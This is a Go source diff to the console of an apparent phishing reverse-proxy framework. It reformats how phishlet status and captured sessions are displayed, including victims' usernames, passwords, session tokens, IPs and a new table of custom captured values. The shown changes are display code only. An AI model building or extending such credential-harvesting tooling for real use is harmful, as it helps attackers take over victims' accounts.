@@ -74,7 +74,7 @@ func (t *Terminal) Close() {
 
 func (t *Terminal) output(s string, args ...interface{}) {
 	out := fmt.Sprintf(s, args...)
-	fmt.Fprintf(color.Output, "\n%s\n\n", out)
+	fmt.Fprintf(color.Output, "\n%s\n", out)
 }
 
 func (t *Terminal) ProcessResourceFile(rc string) {
@@ -94,7 +94,7 @@ func (t *Terminal) ProcessResourceFile(rc string) {
 
 func (t *Terminal) ProcessCommand(line string) bool {
 
-	line = strings.TrimSpace(line)
+	line = strings.TrimSpace(line)	
 
 	args, err := parser.Parse(line)
 	if err != nil {
@@ -164,6 +164,8 @@ func (t *Terminal) DoWork() {
 	t.cfg.refreshActiveHostnames()
 	t.updateCertificates("")
 
+	t.output("%s", t.sprintPhishletStatus(""))
+
 	for !do_quit {
 		line, err := t.rl.Readline()
 		if err == readline.ErrInterrupt {
@@ -223,6 +225,7 @@ func (t *Terminal) handleSessions(args []string) error {
 	lgreen := color.New(color.FgHiGreen)
 	yellow := color.New(color.FgYellow)
 	lred := color.New(color.FgHiRed)
+	cyan := color.New(color.FgCyan)
 
 	pn := len(args)
 	if pn == 0 {
@@ -275,12 +278,23 @@ func (t *Terminal) handleSessions(args []string) error {
 				}
 
 				keys := []string{"id", "phishlet", "username", "password", "tokens", "landing url", "user-agent", "remote ip", "create time", "update time"}
-				vals := []string{strconv.Itoa(s.Id), lred.Sprintf(s.Phishlet), lblue.Sprintf(s.Username), lblue.Sprintf(s.Password), tcol, yellow.Sprintf(s.LandingURL), dgray.Sprintf(s.UserAgent), yellow.Sprintf(s.RemoteAddr), dgray.Sprintf(time.Unix(s.CreateTime, 0).Format("2006-01-02 15:04")), dgray.Sprintf(time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04"))}
-				log.Printf("\n%s\n", AsRows(keys, vals))
+				vals := []string{strconv.Itoa(s.Id), lred.Sprint(s.Phishlet), lblue.Sprint(s.Username), lblue.Sprint(s.Password), tcol, yellow.Sprint(s.LandingURL), dgray.Sprint(s.UserAgent), yellow.Sprint(s.RemoteAddr), dgray.Sprint(time.Unix(s.CreateTime, 0).Format("2006-01-02 15:04")), dgray.Sprint(time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04"))}
+				log.Printf("\n%s", AsRows(keys, vals))
+
+				if len(s.Custom) > 0 {
+					var ckeys []string = []string{"custom", "value"}
+					var cvals [][]string
+					for k, v := range s.Custom {
+						cvals = append(cvals, []string{dgray.Sprint(k), cyan.Sprint(v)})
+					}
+					log.Printf("\n%s", AsTable(ckeys, cvals))
+				}
 
 				if len(s.Tokens) > 0 {
 					json_tokens := t.tokensToJSON(pl, s.Tokens)
-					t.output("%s", json_tokens)
+					t.output("%s\n", json_tokens)
+				} else {
+					t.output("\n")
 				}
 				break
 			}
@@ -417,7 +431,7 @@ func (t *Terminal) handlePhishlets(args []string) error {
 				}
 				out += t.cfg.GetServerIP() + " " + h
 			}
-			t.output("%s", out)
+			t.output("%s\n", out)
 			return nil
 		}
 	} else if pn == 3 {
@@ -446,15 +460,15 @@ func (t *Terminal) handlePhishlets(args []string) error {
 			}
 			out := ""
 			n := 0
-			yellow := color.New(color.FgYellow)
+			hblue := color.New(color.FgHiCyan)
 			for _, u := range urls {
 				if n > 0 {
 					out += "\n"
 				}
-				out += yellow.Sprint(u)
+				out += hblue.Sprint(u)
 				n += 1
 			}
-			t.output("%s", out)
+			t.output("%s\n", out)
 			return nil
 		}
 	}
@@ -569,13 +583,14 @@ func (t *Terminal) updateCertificates(site string) {
 }
 
 func (t *Terminal) sprintPhishletStatus(site string) string {
-	ret := ""
 	higreen := color.New(color.FgHiGreen)
 	hired := color.New(color.FgHiRed)
 	hiblue := color.New(color.FgHiBlue)
 	yellow := color.New(color.FgYellow)
 	hiwhite := color.New(color.FgHiWhite)
 	n := 0
+	cols := []string{"phishlet", "author", "active", "status", "hostname"}
+	var rows [][]string
 	for s, _ := range t.cfg.phishlets {
 		if site == "" || s == site {
 			pl, err := t.cfg.GetPhishlet(s)
@@ -591,19 +606,13 @@ func (t *Terminal) sprintPhishletStatus(site string) string {
 			if t.cfg.IsSiteHidden(s) {
 				hidden_status = hired.Sprint("hidden")
 			}
-			if n > 0 {
-				ret += "\n\n"
-			}
-			ret += "  phishlet: " + hiblue.Sprint(s) + "\n"
-			ret += "    author: " + hiwhite.Sprint(pl.Author) + "\n"
-			ret += "    active: " + status + "\n"
-			ret += "    status: " + hidden_status + "\n"
 			domain, _ := t.cfg.GetSiteDomain(s)
-			ret += "  hostname: " + yellow.Sprint(domain)
 			n += 1
+
+			rows = append(rows, []string{hiblue.Sprint(s), hiwhite.Sprint(pl.Author), status, hidden_status, yellow.Sprint(domain)})
 		}
 	}
-	return ret
+	return AsTable(cols, rows)
 }
 
 func (t *Terminal) phishletPrefixCompleter(args string) []string {
